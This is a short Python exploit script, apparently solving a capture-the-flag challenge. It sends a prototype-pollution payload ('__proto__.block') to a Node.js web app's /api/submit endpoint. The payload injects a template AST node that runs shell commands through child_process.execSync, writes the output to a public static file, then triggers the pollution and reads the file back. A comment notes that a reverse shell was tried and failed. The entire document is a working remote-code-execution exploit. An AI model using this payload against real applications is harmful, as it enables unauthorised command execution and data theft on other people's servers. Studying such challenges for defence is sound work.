import requests

TARGET_URL = 'http://206.189.113.236:30344'
#TARGET_URL = 'http://localhost:1337'

# Make prototype pollution (first find the flag file with the command "ls" then read the content with the command "cat")
# NOTE: since reverse shell doesn't work, save the output in a 'txt' file and the make a request to read it
requests.post(TARGET_URL + '/api/submit', json = {
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync(`ls -al > ./static/output.txt`)"
    }
})

# Execute the polluted object
resp = requests.post(TARGET_URL + '/api/submit', json = {
    "artist.name" : "Haigh"
})

print(resp.text)

resp = requests.get(TARGET_URL + '/static/output.txt')
print(resp.text)
